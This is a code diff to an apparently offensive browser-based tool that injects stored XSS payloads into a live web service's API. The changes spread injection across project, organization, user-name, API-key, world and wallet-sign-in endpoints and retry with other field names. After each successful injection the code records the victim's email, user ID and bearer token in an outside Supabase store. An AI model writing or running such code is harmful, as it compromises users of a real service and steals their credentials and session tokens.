@@ -408,11 +408,13 @@
                 <div class="input-group">
                     <label>Target Endpoint:</label>
                     <select id="xssTarget">
-                        <option value="project">Create Project (POST /projects)</option>
-                        <option value="project-update">Update Project (PATCH /projects/{ID})</option>
-                        <option value="form">Create Form (POST /projects/{ID}/forms)</option>
-                        <option value="app-user">Create App User (POST /projects/{ID}/app-users)</option>
+                        <option value="project">Create Project (POST /organizations/projects)</option>
                         <option value="org-update">Update Organization (PATCH /organizations/current)</option>
+                        <option value="user-update">Update User (PATCH /accounts/users/current)</option>
+                        <option value="api-key">Create API Key (POST /organizations/apiKeys)</option>
+                        <option value="world-create">Create World (POST /worlds)</option>
+                        <option value="world-update">Update World (PATCH /worlds/{ID})</option>
+                        <option value="wallet-signin">Wallet Sign-In (POST /wallet/verify/signin)</option>
                         <option value="custom">Custom Endpoint</option>
                     </select>
                 </div>
@@ -1004,7 +1006,7 @@
             const val = this.value;
             document.getElementById('customEndpointGroup').style.display = val === 'custom' ? 'block' : 'none';
             document.getElementById('projectIdGroup').style.display =
-                ['project-update', 'form', 'app-user'].includes(val) ? 'block' : 'none';
+                val === 'world-update' ? 'block' : 'none';
         });
 
         async function injectXSS() {
@@ -1022,29 +1024,39 @@
 
             switch(target) {
                 case 'project':
-                    endpoint = 'projects';
+                    endpoint = 'organizations/projects';
                     method = 'POST';
-                    body = JSON.stringify({ name: payload, description: 'Project created by ODK Manager' });
-                    break;
-                case 'project-update':
-                    endpoint = `projects/${projectId}`;
-                    method = 'PATCH';
-                    body = JSON.stringify({ name: payload });
-                    break;
-                case 'form':
-                    endpoint = `projects/${projectId}/forms`;
-                    method = 'POST';
-                    body = JSON.stringify({ name: payload, version: '1.0' });
-                    break;
-                case 'app-user':
-                    endpoint = `projects/${projectId}/app-users`;
-                    method = 'POST';
-                    body = JSON.stringify({ displayName: payload });
+                    body = JSON.stringify({ name: payload, description: 'ODK Project' });
                     break;
                 case 'org-update':
                     endpoint = 'organizations/current';
                     method = 'PATCH';
                     body = JSON.stringify({ name: payload });
+                    break;
+                case 'user-update':
+                    endpoint = 'accounts/users/current';
+                    method = 'PATCH';
+                    body = JSON.stringify({ displayName: payload });
+                    break;
+                case 'api-key':
+                    endpoint = 'organizations/apiKeys';
+                    method = 'POST';
+                    body = JSON.stringify({ displayName: payload });
+                    break;
+                case 'world-create':
+                    endpoint = 'worlds';
+                    method = 'POST';
+                    body = JSON.stringify({ name: payload, description: 'New World' });
+                    break;
+                case 'world-update':
+                    endpoint = `worlds/${projectId}`;
+                    method = 'PATCH';
+                    body = JSON.stringify({ name: payload });
+                    break;
+                case 'wallet-signin':
+                    endpoint = 'wallet/verify/signin';
+                    method = 'POST';
+                    body = JSON.stringify({ evmWalletAddress: payload });
                     break;
                 case 'custom':
                     endpoint = document.getElementById('xssCustomEndpoint').value;
@@ -1140,24 +1152,38 @@
 
         async function injectAllPayloads() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('xssLog', '[XSS] Injecting ALL payloads into project names...', 'warning');
+            log('xssLog', '[XSS] Injecting ALL payloads across multiple endpoints...', 'warning');
+
+            // Try multiple endpoints with each payload
+            const injectionTargets = [
+                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project' },
+                { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org Name' },
+                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'Update User DisplayName' },
+                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'Create API Key' },
+                { endpoint: 'worlds', method: 'POST', field: 'name', desc: 'Create World' },
+            ];
 
             for (let i = 0; i < XSS_PAYLOADS.length; i++) {
                 const p = XSS_PAYLOADS[i];
-                log('xssLog', `[${i+1}/${XSS_PAYLOADS.length}] Injecting: ${p.name}...`, 'info');
+                const target = injectionTargets[i % injectionTargets.length];
+                log('xssLog', `[${i+1}/${XSS_PAYLOADS.length}] ${p.name} → ${target.desc}...`, 'info');
 
                 try {
-                    const resp = await fetch(`${API}/projects`, {
-                        method: 'POST',
+                    const bodyObj = {};
+                    bodyObj[target.field] = p.payload;
+                    if (target.method === 'POST') bodyObj.description = `Test ${p.name}`;
+
+                    const resp = await fetch(`${API}/${target.endpoint}`, {
+                        method: target.method,
                         headers: {
                             'Authorization': `Bearer ${idToken}`,
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ name: p.payload, description: `Test ${p.name}` })
+                        body: JSON.stringify(bodyObj)
                     });
 
                     if (resp.ok) {
-                        log('xssLog', `[+] ${p.name}: INJECTED!`, 'success');
+                        log('xssLog', `[+] ${p.name}: INJECTED into ${target.desc}!`, 'success');
                         xssInjected++;
 
                         await saveToSupabase({
@@ -1165,40 +1191,19 @@
                             victim_email: currentUser?.email || '',
                             victim_uid: currentUser?.uid || '',
                             id_token: idToken,
-                            xss_target: 'POST /projects',
+                            xss_target: `${target.method} ${API}/${target.endpoint}`,
                             xss_payload: p.payload,
-                            notes: `Bulk XSS: ${p.name} (${p.tag})`
+                            notes: `Bulk XSS: ${p.name} (${p.tag}) into ${target.desc}`
                         });
                     } else {
                         const status = resp.status;
-                        log('xssLog', `[-] ${p.name}: Failed (${status})`, 'error');
+                        const errText = await resp.text().catch(() => '');
+                        log('xssLog', `[-] ${p.name}: Failed (${status}) ${errText.substring(0, 60)}`, 'error');
 
+                        // Try alternative field names
                         if (status === 400 || status === 422) {
-                            log('xssLog', `[RETRY] Trying PATCH on project 1...`, 'warning');
-                            try {
-                                const patchResp = await fetch(`${API}/projects/1`, {
-                                    method: 'PATCH',
-                                    headers: {
-                                        'Authorization': `Bearer ${idToken}`,
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({ name: p.payload })
-                                });
-                                if (patchResp.ok) {
-                                    log('xssLog', `[+] ${p.name}: INJECTED via PATCH!`, 'success');
-                                    xssInjected++;
-
-                                    await saveToSupabase({
-                                        attack_type: 'xss_injection_patch',
-                                        victim_email: currentUser?.email || '',
-                                        victim_uid: currentUser?.uid || '',
-                                        id_token: idToken,
-                                        xss_target: 'PATCH /projects/1',
-                                        xss_payload: p.payload,
-                                        notes: `XSS via PATCH: ${p.name}`
-                                    });
-                                }
-                            } catch(e) {}
+                            log('xssLog', `[RETRY] Trying alt fields...`, 'warning');
+                            await tryAlternativeFields(target.endpoint, target.method, p.payload);
                         }
                     }
                 } catch(e) {
@@ -1217,39 +1222,53 @@
             const testPayload = '<img src=x onerror="window.__xss_test=true">';
             log('xssLog', '[TEST] Testing XSS reflection with harmless payload...', 'info');
 
-            try {
-                const resp = await fetch(`${API}/projects`, {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': `Bearer ${idToken}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ name: testPayload, description: 'XSS Reflection Test' })
-                });
+            // Test multiple endpoints for reflection
+            const testTargets = [
+                { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Project Name' },
+                { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'User DisplayName' },
+                { endpoint: 'organizations/apiKeys', method: 'POST', field: 'displayName', desc: 'API Key Name' },
+            ];
 
-                if (resp.ok) {
-                    const data = await resp.json();
-                    log('xssLog', `[TEST] Project created. Check if name is reflected as HTML in dashboard.`, 'success');
-                    log('xssLog', `[TEST] Response: ${JSON.stringify(data)}`, 'data');
-                    log('xssLog', `[TEST] If the <img> tag renders as broken image in dashboard, XSS works!`, 'warning');
-                    log('xssLog', `[TEST] Open https://odk.otherside.xyz/dashboard and check project list.`, 'info');
+            for (const t of testTargets) {
+                log('xssLog', `[TEST] Trying ${t.desc}...`, 'info');
+                try {
+                    const bodyObj = {};
+                    bodyObj[t.field] = testPayload;
+                    if (t.method === 'POST') bodyObj.description = 'XSS Test';
 
-                    await saveToSupabase({
-                        attack_type: 'xss_reflection_test',
-                        victim_email: currentUser?.email || '',
-                        victim_uid: currentUser?.uid || '',
-                        id_token: idToken,
-                        xss_target: 'POST /projects',
-                        xss_payload: testPayload,
-                        notes: 'XSS reflection test - check if HTML is rendered'
+                    const resp = await fetch(`${API}/${t.endpoint}`, {
+                        method: t.method,
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(bodyObj)
                     });
 
-                } else {
-                    log('xssLog', `[-] Test failed: ${resp.status}`, 'error');
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('xssLog', `[+] ${t.desc}: CREATED! Check if reflected as HTML.`, 'success');
+                        log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
+
+                        await saveToSupabase({
+                            attack_type: 'xss_reflection_test',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            xss_target: `${t.method} ${API}/${t.endpoint}`,
+                            xss_payload: testPayload,
+                            notes: `XSS reflection test: ${t.desc}`
+                        });
+                    } else {
+                        const errText = await resp.text().catch(() => '');
+                        log('xssLog', `[-] ${t.desc}: Failed (${resp.status}) ${errText.substring(0, 60)}`, 'error');
+                    }
+                } catch(e) {
+                    log('xssLog', `[!] ${t.desc}: Error - ${e.message}`, 'error');
                 }
-            } catch(e) {
-                log('xssLog', `[!] Error: ${e.message}`, 'error');
             }
+
+            log('xssLog', '[TEST] Open https://odk.otherside.xyz/dashboard to check if HTML renders!', 'warning');
         }
     </script>
 </body>
